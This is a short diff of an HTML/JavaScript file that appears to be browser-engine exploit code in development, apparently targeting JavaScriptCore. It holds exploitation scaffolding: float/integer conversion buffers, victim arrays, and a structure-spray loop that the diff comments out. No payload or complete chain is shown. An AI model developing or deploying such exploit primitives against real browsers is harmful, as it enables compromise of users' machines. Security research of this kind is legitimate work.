@@ -1,7 +1,7 @@
 <script src="utils.js"> </script>
 <script>
-debugger;
-//let print = alert;
+//debugger;
+let print = alert;
 //var ALLOCS = 1000
 let convert = new ArrayBuffer(0x8);
 let f64 = new Float64Array(convert);
@@ -36,13 +36,13 @@ function gc() {
 let objX = {objProperty: {fetchme : 0x1234}};
 let objY = {doubleProperty: []};
 let victim5 = [1.1, 2.2, 3.3, 4.4, 5.5];
-let structs = [];
+/*let structs = [];
 for (let i = 0; i < 0x1000; i++) {
     var tmp = [1.1];
     tmp.pointer = i2f(0x1234);
     tmp['spray' + i.toString()] = 3.3;
     structs.push(tmp);
-}
+}*/
 // Create a plain array with indexing type SlowPutArrayStorage. This is equivalent to
 // `arrayStructureForIndexingTypeDuringAllocation(ArrayWithSlowPutArrayStorage)` in C++.
 function createArrayWithSlowPutArrayStorage() {
